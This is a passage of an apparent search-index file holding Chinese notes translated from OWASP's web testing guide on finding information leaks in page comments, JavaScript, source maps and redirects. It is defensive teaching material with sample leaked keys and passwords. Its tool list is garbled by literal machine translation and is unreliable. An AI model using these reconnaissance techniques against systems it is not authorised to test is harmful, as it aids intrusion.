\u4ee3\u7801\u4e2d\u6cc4\u9732\u3002\u5e94\u8fdb\u884c\u5ba1\u67e5\uff0c\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u6ee5\u7528\u3002</p> <p>\u5bf9\u4e8e\u5927\u578b\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0c\u6027\u80fd\u95ee\u9898\u662f\u7a0b\u5e8f\u5458\u975e\u5e38\u5173\u5fc3\u7684\u95ee\u9898\u3002\u7a0b\u5e8f\u5458\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u4f18\u5316\u524d\u7aef\u6027\u80fd\uff0c\u5305\u62ec Syntactically Awesome Style Sheets (SASS)\u3001Sassy CSS (SCSS)\u3001webpack \u7b49\u3002\u4f7f\u7528\u8fd9\u4e9b\u6280\u672f\uff0c\u524d\u7aef\u4ee3\u7801\u6709\u65f6\u4f1a\u53d8\u5f97\u66f4\u96be\u7406\u89e3\u548c\u96be\u4ee5\u8c03\u8bd5\uff0c\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u7a0b\u5e8f\u5458\u7ecf\u5e38\u90e8\u7f72\u6e90\u6620\u5c04\u6587\u4ef6\u4ee5\u8fdb\u884c\u8c03\u8bd5\u3002\u201c\u6e90\u5730\u56fe\u201d\u662f\u4e00\u79cd\u7279\u6b8a\u6587\u4ef6\uff0c\u5b83\u5c06\u8d44\u4ea7\uff08CSS \u6216 JavaScript\uff09\u7684\u7f29\u5c0f/\u4e11\u5316\u7248\u672c\u8fde\u63a5\u5230\u539f\u59cb\u521b\u4f5c\u7248\u672c\u3002\u7a0b\u5e8f\u5458\u4ecd\u5728\u4e89\u8bba\u662f\u5426\u5c06\u6e90\u6620\u5c04\u6587\u4ef6\u5e26\u5230\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u4f46\u662f\uff0c\u4e0d\u53ef\u5426\u8ba4\u7684\u662f\uff0c\u5982\u679c\u5c06\u6e90\u6620\u5c04\u6587\u4ef6\u6216\u7528\u4e8e\u8c03\u8bd5\u7684\u6587\u4ef6\u53d1\u5e03\u5230\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5c06\u4f7f\u5b83\u4eec\u7684\u6e90\u4ee3\u7801\u66f4\u5177\u53ef\u8bfb\u6027\u3002\u5b83\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u4ece\u524d\u7aef\u53d1\u73b0\u6f0f\u6d1e\u6216\u4ece\u4e2d\u6536\u96c6\u654f\u611f\u4fe1\u606f\u3002\u5e94\u8be5\u8fdb\u884c JavaScript \u4ee3\u7801\u5ba1\u67e5\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u8c03\u8bd5\u6587\u4ef6\u4ece\u524d\u7aef\u516c\u5f00\u3002\u6839\u636e\u9879\u76ee\u7684\u4e0a\u4e0b\u6587\u548c\u654f\u611f\u6027\uff0c\u5b89\u5168\u4e13\u5bb6\u5e94\u51b3\u5b9a\u6587\u4ef6\u662f\u5426\u5e94\u5b58\u5728\u4e8e\u751f\u4ea7\u73af\u5883\u4e2d\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_27","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u67e5\u770b\u7f51\u9875\u8bc4\u8bba\u3001\u5143\u6570\u636e\u548c\u91cd\u5b9a\u5411\u6b63\u6587\u4ee5\u53d1\u73b0\u4efb\u4f55\u4fe1\u606f\u6cc4\u6f0f\u3002</li> <li>\u6536\u96c6 JavaScript \u6587\u4ef6\u5e76\u67e5\u770b JS \u4ee3\u7801\uff0c\u4ee5\u66f4\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u5e76\u67e5\u627e\u4efb\u4f55\u4fe1\u606f\u6cc4\u6f0f\u3002</li> <li>\u786e\u5b9a\u6e90\u6620\u5c04\u6587\u4ef6\u6216\u5176\u4ed6\u524d\u7aef\u8c03\u8bd5\u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_28","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_29","title":"\u67e5\u770b\u7f51\u9875\u8bc4\u8bba\u548c\u5143\u6570\u636e","text":"<p>\u5f00\u53d1\u4eba\u5458\u7ecf\u5e38\u4f7f\u7528 HTML \u6ce8\u91ca\u6765\u5305\u542b\u6709\u5173\u5e94\u7528\u7a0b\u5e8f\u7684\u8c03\u8bd5\u4fe1\u606f\u3002\u6709\u65f6\uff0c\u4ed6\u4eec\u4f1a\u5fd8\u8bb0\u8bc4\u8bba\u5e76\u5c06\u5176\u7559\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5bfb\u627e\u4ee5 \u5f00\u5934\u7684 HTML \u6ce8\u91ca<code>&lt;!--</code>\u3002</p> <p>\u68c0\u67e5 HTML \u6e90\u4ee3\u7801\u4e2d\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u6ce8\u91ca\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u66f4\u6df1\u5165\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u53ef\u80fd\u662f SQL \u4ee3\u7801\u3001\u7528\u6237\u540d\u548c\u5bc6\u7801\u3001\u5185\u90e8 IP \u5730\u5740\u6216\u8c03\u8bd5\u4fe1\u606f\u3002</p> <pre><code>...\n&lt;div class=\"table2\"&gt;\n  &lt;div class=\"col1\"&gt;1&lt;/div&gt;&lt;div class=\"col2\"&gt;Mary&lt;/div&gt;\n  &lt;div class=\"col1\"&gt;2&lt;/div&gt;&lt;div class=\"col2\"&gt;Peter&lt;/div&gt;\n  &lt;div class=\"col1\"&gt;3&lt;/div&gt;&lt;div class=\"col2\"&gt;Joe&lt;/div&gt;\n\n&lt;!-- Query: SELECT id, name FROM app.users WHERE active='1' --&gt;\n\n&lt;/div&gt;\n...\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u751a\u81f3\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>&lt;!-- Use the DB administrator password for testing:  f@keP@a$$w0rD --&gt;\n</code></pre> <p>\u68c0\u67e5 HTML \u7248\u672c\u4fe1\u606f\u4ee5\u83b7\u53d6\u6709\u6548\u7684\u7248\u672c\u53f7\u548c\u6570\u636e\u7c7b\u578b\u5b9a\u4e49 (DTD) URL</p> <pre><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n</code></pre> <ul> <li><code>strict.dtd</code>\u2013 \u9ed8\u8ba4\u4e25\u683c DTD</li> <li><code>loose.dtd</code>\u2013 \u5bbd\u677e\u7684 DTD</li> <li><code>frameset.dtd</code>\u2013 \u6846\u67b6\u96c6\u6587\u6863\u7684 DTD</li> </ul> <p>\u6709\u4e9b<code>META</code>\u6807\u7b7e\u4e0d\u63d0\u4f9b\u4e3b\u52a8\u653b\u51fb\u5411\u91cf\uff0c\u800c\u662f\u5141\u8bb8\u653b\u51fb\u8005\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\uff1a</p> <pre><code>&lt;META name=\"Author\" content=\"Andrew Muller\"&gt;\n</code></pre> <p>\u4e00\u4e2a\u5e38\u89c1\u7684\uff08\u4f46\u4e0d\u7b26\u5408WCAG\uff09<code>META</code>\u6807\u7b7e\u662fRefresh\u3002</p> <pre><code>&lt;META http-equiv=\"Refresh\" content=\"15;URL=https://www.owasp.org/index.html\"&gt;\n</code></pre> <p>\u6807\u7b7e\u7684\u4e00\u4e2a\u5e38\u89c1\u7528\u9014<code>META</code>\u662f\u6307\u5b9a\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u7528\u6765\u63d0\u9ad8\u641c\u7d22\u7ed3\u679c\u8d28\u91cf\u7684\u5173\u952e\u5b57\u3002</p> <pre><code>&lt;META name=\"keywords\" lang=\"en-us\" content=\"OWASP, security, sunshine, lollipops\"&gt;\n</code></pre> <p>\u867d\u7136\u5927\u591a\u6570\u7f51\u7edc\u670d\u52a1\u5668\u901a\u8fc7\u6587\u4ef6\u6765\u7ba1\u7406\u641c\u7d22\u5f15\u64ce\u7d22\u5f15<code>robots.txt</code>\uff0c\u4f46\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>META</code>\u6807\u7b7e\u6765\u7ba1\u7406\u3002\u4e0b\u9762\u7684\u6807\u7b7e\u5c06\u5efa\u8bae\u673a\u5668\u4eba\u4e0d\u8981\u7f16\u5236\u7d22\u5f15\uff0c\u4e5f\u4e0d\u8981\u8ddf\u8e2a\u5305\u542b\u8be5\u6807\u7b7e\u7684 HTML \u9875\u9762\u4e0a\u7684\u94fe\u63a5\u3002</p> <pre><code>&lt;META name=\"robots\" content=\"none\"&gt;\n</code></pre> <p>\u4e92\u8054\u7f51\u5185\u5bb9\u9009\u62e9\u5e73\u53f0 (PICS)\u548c\u7f51\u7edc\u63cf\u8ff0\u8d44\u6e90\u534f\u8bae (POWDER)\u63d0\u4f9b\u4e86\u5c06\u5143\u6570\u636e\u4e0e\u4e92\u8054\u7f51\u5185\u5bb9\u76f8\u5173\u8054\u7684\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#javascript-javascript","title":"\u8bc6\u522b JavaScript \u4ee3\u7801\u5e76\u6536\u96c6 JavaScript \u6587\u4ef6","text":"<p>\u7a0b\u5e8f\u5458\u7ecf\u5e38\u5728\u524d\u7aef\u4f7f\u7528 JavaScript \u53d8\u91cf\u5bf9\u654f\u611f\u4fe1\u606f\u8fdb\u884c\u786c\u7f16\u7801\u3002<code>&lt;script&gt;</code>\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u68c0\u67e5 HTML \u6e90\u4ee3\u7801\u5e76\u5728\u548c\u6807\u8bb0\u4e4b\u95f4\u5bfb\u627e JavaScript \u4ee3\u7801<code>&lt;/script&gt;</code>\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u8bc6\u522b\u5916\u90e8 JavaScript \u6587\u4ef6\u4ee5\u5ba1\u67e5\u4ee3\u7801\uff08JavaScript \u6587\u4ef6\u7684\u6587\u4ef6\u6269\u5c55\u540d<code>.js</code>\u548c JavaScript \u6587\u4ef6\u7684\u540d\u79f0\u901a\u5e38\u653e\u5728\u6807\u7b7e\u7684<code>src</code>(source) \u5c5e\u6027\u4e2d\uff09\u3002<code>&lt;script&gt;</code></p> <p>\u68c0\u67e5 JavaScript \u4ee3\u7801\u662f\u5426\u5b58\u5728\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u6cc4\u6f0f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u4e00\u6b65\u6ee5\u7528\u6216\u64cd\u7eb5\u7cfb\u7edf\u3002\u67e5\u627e\u4ee5\u4e0b\u503c\uff1aAPI \u5bc6\u94a5\u3001\u5185\u90e8 IP \u5730\u5740\u3001\u654f\u611f\u8def\u7531\u6216\u51ed\u636e\u3002\u4f8b\u5982\uff1a</p> <pre><code>const myS3Credentials = {\n  accessKeyId: config('AWSS3AccessKeyID'),\n  secretAcccessKey: config('AWSS3SecretAccessKey'),\n};\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u751a\u81f3\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>var conString = \"tcp://postgres:1234@localhost/postgres\";\n</code></pre> <p>\u627e\u5230 API \u5bc6\u94a5\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u68c0\u67e5 API \u5bc6\u94a5\u9650\u5236\u662f\u6309\u670d\u52a1\u8bbe\u7f6e\u7684\uff0c\u8fd8\u662f\u6309 IP\u3001HTTP \u5f15\u8350\u6765\u6e90\u7f51\u5740\u3001\u5e94\u7528\u7a0b\u5e8f\u3001SDK \u7b49\u8bbe\u7f6e\u7684\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u627e\u5230 Google Map API \u5bc6\u94a5\uff0c\u4ed6\u4eec\u53ef\u4ee5\u68c0\u67e5\u6b64 API \u5bc6\u94a5\u662f\u53d7 IP \u9650\u5236\u8fd8\u662f\u4ec5\u53d7 Google Map API \u9650\u5236\u3002\u5982\u679c Google API Key \u4ec5\u6839\u636e Google Map API \u53d7\u5230\u9650\u5236\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u8be5 API Key \u67e5\u8be2\u4e0d\u53d7\u9650\u5236\u7684 Google Map API\uff0c\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u5fc5\u987b\u4e3a\u6b64\u4ed8\u8d39\u3002</p> <pre><code>\n&lt;script type=\"application/json\"&gt;\n...\n{\"GOOGLE_MAP_API_KEY\":\"AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\", \"RECAPTCHA_KEY\":\"6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\"}\n...\n&lt;/script&gt;\n</code></pre> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u4ece JavaScript \u4ee3\u7801\u4e2d\u627e\u5230\u654f\u611f\u8def\u5f84\uff0c\u4f8b\u5982\u6307\u5411\u5185\u90e8\u6216\u9690\u85cf\u7ba1\u7406\u9875\u9762\u7684\u94fe\u63a5\u3002</p> <pre><code>&lt;script type=\"application/json\"&gt;\n...\n\"runtimeConfig\":{\"BASE_URL_VOUCHER_API\":\"https://staging-voucher.victim.net/api\", \"BASE_BACKOFFICE_API\":\"https://10.10.10.2/api\", \"ADMIN_PAGE\":\"/hidden_administrator\"}\n...\n&lt;/script&gt;\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_30","title":"\u8bc6\u522b\u6e90\u6620\u5c04\u6587\u4ef6","text":"<p>\u6e90\u6620\u5c04\u6587\u4ef6\u901a\u5e38\u4f1a\u5728 DevTools \u6253\u5f00\u65f6\u52a0\u8f7d\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5728\u6bcf\u4e2a\u5916\u90e8 JavaScript \u6587\u4ef6\u7684\u6269\u5c55\u540d\u540e\u6dfb\u52a0\u201c.map\u201d\u6269\u5c55\u540d\u6765\u67e5\u627e\u6e90\u6620\u5c04\u6587\u4ef6\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u770b\u5230\u4e00\u4e2a<code>/static/js/main.chunk.js</code>\u6587\u4ef6\uff0c\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee<code>/static/js/main.chunk.js.map</code>.</p> <p>\u68c0\u67e5\u6e90\u6620\u5c04\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u66f4\u6df1\u5165\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u3002\u4f8b\u5982\uff1a</p> <pre><code>{\n  \"version\": 3,\n  \"file\": \"static/js/main.chunk.js\",\n  \"sources\": [\n    \"/home/sysadmin/cashsystem/src/actions/index.js\",\n    \"/home/sysadmin/cashsystem/src/actions/reportAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/cashoutAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/userAction.js\",\n    \"...\"\n  ],\n  \"...\"\n}\n</code></pre> <p>\u5f53\u7f51\u7ad9\u52a0\u8f7d\u6e90\u6620\u5c04\u6587\u4ef6\u65f6\uff0c\u524d\u7aef\u6e90\u4ee3\u7801\u5c06\u53d8\u5f97\u53ef\u8bfb\u4e14\u66f4\u6613\u4e8e\u8c03\u8bd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_31","title":"\u8bc6\u522b\u6cc4\u6f0f\u4fe1\u606f\u7684\u91cd\u5b9a\u5411\u54cd\u5e94","text":"<p>\u5c3d\u7ba1\u91cd\u5b9a\u5411\u54cd\u5e94\u901a\u5e38\u4e0d\u4f1a\u5305\u542b\u4efb\u4f55\u91cd\u8981\u7684 Web \u5185\u5bb9\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u5b83\u4eec\u4e0d\u4f1a\u5305\u542b\u4efb\u4f55\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u867d\u7136 300 \u7cfb\u5217\uff08\u91cd\u5b9a\u5411\uff09\u54cd\u5e94\u901a\u5e38\u5305\u542b\u201c\u91cd\u5b9a\u5411\u5230<code>https://example.com/</code>\u201d\u7c7b\u578b\u7684\u5185\u5bb9\uff0c\u4f46\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f1a\u6cc4\u9732\u5185\u5bb9\u3002</p> <p>\u8003\u8651\u91cd\u5b9a\u5411\u54cd\u5e94\u662f\u8eab\u4efd\u9a8c\u8bc1\u6216\u6388\u6743\u68c0\u67e5\u7684\u7ed3\u679c\u7684\u60c5\u51b5\uff0c\u5982\u679c\u8be5\u68c0\u67e5\u5931\u8d25\uff0c\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u54cd\u5e94\u5c06\u7528\u6237\u91cd\u5b9a\u5411\u56de\u201c\u5b89\u5168\u201d\u6216\u201c\u9ed8\u8ba4\u201d\u9875\u9762\uff0c\u4f46\u91cd\u5b9a\u5411\u54cd\u5e94\u672c\u8eab\u53ef\u80fd\u4ecd\u5305\u542b\u5185\u5bb9\u5b83\u6ca1\u6709\u5728\u6d4f\u89c8\u5668\u4e2d\u663e\u793a\uff0c\u4f46\u786e\u5b9e\u4f20\u8f93\u7ed9\u4e86\u5ba2\u6237\u7aef\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u6d4f\u89c8\u5668\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u6216\u901a\u8fc7\u4e2a\u4eba\u4ee3\u7406\uff08\u4f8b\u5982 ZAP\u3001Burp\u3001Fiddler \u6216 Charles\uff09\u6765\u5b9e\u73b0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_32","title":"\u5de5\u5177","text":"<ul> <li>Wget</li> <li>\u6d4f\u89c8\u5668\u201c\u67e5\u770b\u6e90\u4ee3\u7801\u201d\u529f\u80fd</li> <li>\u773c\u7403</li> <li>\u5377\u66f2</li> <li>Zaproxy</li> <li>\u6253\u55dd\u5957\u4ef6</li> <li>\u8fd4\u56de\u7f51\u5740</li> <li>\u8c37\u6b4c\u5730\u56fe API \u626b\u63cf\u4eea</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_33","title":"\u53c2\u8003","text":"<ul> <li>\u94a5\u5319\u9ed1\u5ba2</li> <li>RingZer0 \u5728\u7ebf CTF\u00a0- \u6311\u6218 104 \u201c\u7ba1\u7406\u9762\u677f\u201d\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_34","title":"\u767d\u76ae\u4e66","text":"<ul> <li>HTML \u7248\u672c 4.01</li> <li>XHTML</li> <li>HTML \u7248\u672c 5</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_35","title":"\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_36","title":"\u6982\u62ec","text":"<p>\u5728\u8fdb\u884c\u4efb\u4f55\u5f7b\u5e95\u7684\u6d4b\u8bd5\u4e4b\u524d\uff0c\u679a\u4e3e\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u653b\u51fb\u9762\u662f\u4e00\u4e2a\u5173\u952e\u7684\u5148\u51b3\u6761\u4ef6\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u53ef\u80fd\u7684\u5f31\u70b9\u533a\u57df\u3002\u672c\u8282\u65e8\u5728\u5e2e\u52a9\u8bc6\u522b\u548c\u6620\u5c04\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u533a\u57df\uff0c\u4e00\u65e6\u679a\u4e3e\u548c\u6620\u5c04\u5b8c\u6210\u540e\u5e94\u8fdb\u884c\u8c03\u67e5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_37","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u901a\u8fc7\u8bf7\u6c42\u548c\u54cd\u5e94\u5206\u6790\u786e\u5b9a\u53ef\u80fd\u7684\u5165\u53e3\u548c\u6ce8\u5165\u70b9\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_38","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u5728\u5f00\u59cb\u4efb\u4f55\u6d4b\u8bd5\u4e4b\u524d\uff0c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u59cb\u7ec8\u5f88\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u7528\u6237\u548c\u6d4f\u89c8\u5668\u5982\u4f55\u4e0e\u4e4b\u901a\u4fe1\u3002\u5f53\u6d4b\u8bd5\u4eba\u5458\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u5e94\u8be5\u6ce8\u610f\u6240\u6709 HTTP \u8bf7\u6c42\u4ee5\u53ca\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u53c2\u6570\u548c\u8868\u5355\u5b57\u6bb5\u3002\u4ed6\u4eec\u5e94\u7279\u522b\u6ce8\u610f\u4f55\u65f6\u4f7f\u7528 GET \u8bf7\u6c42\u4ee5\u53ca\u4f55\u65f6\u4f7f\u7528 POST \u8bf7\u6c42\u5411\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u53c2\u6570\u3002\u6b64\u5916\uff0c\u4ed6\u4eec\u8fd8\u9700\u8981\u6ce8\u610f\u4f55\u65f6\u4f7f\u7528\u5176\u4ed6\u7528\u4e8e RESTful \u670d\u52a1\u7684\u65b9\u6cd5\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u4e3a\u4e86\u67e5\u770b\u5728\u8bf7\u6c42\u6b63\u6587\uff08\u4f8b\u5982 POST \u8bf7\u6c42\uff09\u4e2d\u53d1\u9001\u7684\u53c2\u6570\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u8bf8\u5982\u62e6\u622a\u4ee3\u7406\u4e4b\u7c7b\u7684\u5de5\u5177\uff08\u8bf7\u53c2\u9605\u5de5\u5177\uff09\u3002\u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u7279\u522b\u6ce8\u610f\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u9690\u85cf\u8868\u5355\u5b57\u6bb5\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u901a\u5e38\u5305\u542b\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982\u72b6\u6001\u4fe1\u606f\u3001\u9879\u76ee\u6570\u91cf\u3001\u9879\u76ee\u4ef7\u683c\uff0c\u5f00\u53d1\u4eba\u5458\u6c38\u8fdc\u4e0d\u4f1a\u65e8\u5728\u4f9b\u4efb\u4f55\u4eba\u67e5\u770b\u6216\u66f4\u6539\u3002</p> <p>\u6839\u636e\u4f5c\u8005\u7684\u7ecf\u9a8c\uff0c\u5728\u8fd9\u4e2a\u6d4b\u8bd5\u9636\u6bb5\u4f7f\u7528\u62e6\u622a\u4ee3\u7406\u548c\u7535\u5b50\u8868\u683c\u975e\u5e38\u6709\u7528\u3002\u4ee3\u7406\u5c06\u5728\u6d4b\u8bd5\u4eba\u5458\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u65f6\u8ddf\u8e2a\u6d4b\u8bd5\u4eba\u5458\u548c\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u6bcf\u4e2a\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u6b64\u5916\uff0c\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6d4b\u8bd5\u4eba\u5458\u901a\u5e38\u4f1a\u6355\u83b7\u6bcf\u4e2a\u8bf7\u6c42\u548c\u54cd\u5e94\uff0c\u4ee5\u4fbf\u4ed6\u4eec\u53ef\u4ee5\u51c6\u786e\u5730\u770b\u5230\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u6807\u5934\u3001\u53c2\u6570\u7b49\u4ee5\u53ca\u8fd4\u56de\u7684\u5185\u5bb9\u3002\u8fd9\u6709\u65f6\u4f1a\u975e\u5e38\u4e4f\u5473\uff0c\u5c24\u5176\u662f\u5728\u5927\u578b\u4ea4\u4e92\u5f0f\u7f51\u7ad9\u4e0a\uff08\u60f3\u60f3\u94f6\u884c\u5e94\u7528\u7a0b\u5e8f\uff09\u3002\u7136\u800c\uff0c\u7ecf\u9a8c\u4f1a\u544a\u8bc9\u6211\u4eec\u8981\u5bfb\u627e\u4ec0\u4e48\uff0c\u8fd9\u4e2a\u9636\u6bb5\u53ef\u4ee5\u5927\u5927\u51cf\u5c11\u3002</p> <p>\u5f53\u6d4b\u8bd5\u4eba\u5458\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u5e94\u8be5\u8bb0\u4e0b URL\u3001\u81ea\u5b9a\u4e49\u6807\u5934\u6216\u8bf7\u6c42/\u54cd\u5e94\u6b63\u6587\u4e2d\u7684\u4efb\u4f55\u6709\u8da3\u53c2\u6570\uff0c\u5e76\u5c06\u5b83\u4eec\u4fdd\u5b58\u5728\u7535\u5b50\u8868\u683c\u4e2d\u3002\u7535\u5b50\u8868\u683c\u5e94\u5305\u62ec\u8bf7\u6c42\u7684\u9875\u9762\uff08\u6700\u597d\u8fd8\u6dfb\u52a0\u6765\u81ea\u4ee3\u7406\u7684\u8bf7\u6c42\u7f16\u53f7\uff0c\u4ee5\u4f9b\u5c06\u6765\u53c2\u8003\uff09\u3001\u6709\u8da3\u7684\u53c2\u6570\u3001\u8bf7\u6c42\u7c7b\u578b\uff08GET\u3001POST \u7b49\uff09\uff0c\u5982\u679c\u8bbf\u95ee\u662f\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1/\u672a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\uff0c\u5982\u679c\u4f7f\u7528 TLS\uff0c\u5982\u679c\u5b83\u662f\u591a\u6b65\u9aa4\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u5982\u679c\u4f7f\u7528 